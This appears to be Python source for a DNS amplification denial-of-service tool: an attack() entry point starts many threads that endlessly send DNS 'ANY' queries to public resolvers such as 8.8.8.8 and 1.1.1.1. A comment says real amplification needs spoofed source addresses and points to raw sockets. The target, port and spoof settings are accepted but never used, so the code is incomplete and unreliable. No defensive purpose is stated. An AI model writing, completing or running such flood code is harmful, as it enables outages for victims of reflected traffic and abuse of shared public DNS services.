import socket
import struct
import random
import threading
import time

DNS_SERVERS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9",
    "208.67.222.222", "208.67.220.220",
]

class DNSAmplification:
    def __init__(self, target, port, threads, duration, spoof=False):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.spoof = spoof
        self.stop_event = threading.Event()

    def _build_dns_query(self):
        transaction_id = random.randint(0, 65535)
        flags = 0x0100  # standard query
        questions = 1
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0

        # Query "ANY" for example.com
        qname = b'\x07example\x03com\x00'
        qtype = 255  # ANY
        qclass = 1

        header = struct.pack('!HHHHHH', transaction_id, flags, questions,
                             answer_rrs, authority_rrs, additional_rrs)
        return header + qname + struct.pack('!HH', qtype, qclass)

    def _send_dns(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        query = self._build_dns_query()
        while not self.stop_event.is_set():
            for dns in DNS_SERVERS:
                try:
                    # Note: real amplification requires spoofed source, but here we send to DNS directly
                    # For actual amplification, use raw socket with spoofed source
                    sock.sendto(query, (dns, 53))
                except Exception:
                    pass

    def start(self):
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._send_dns)
            t.daemon = True
            t.start()
            threads.append(t)

        time.sleep(self.duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)

def attack(target, port, threads, duration, spoof=False):
    flood = DNSAmplification(target, port, threads, duration, spoof)
    flood.start()
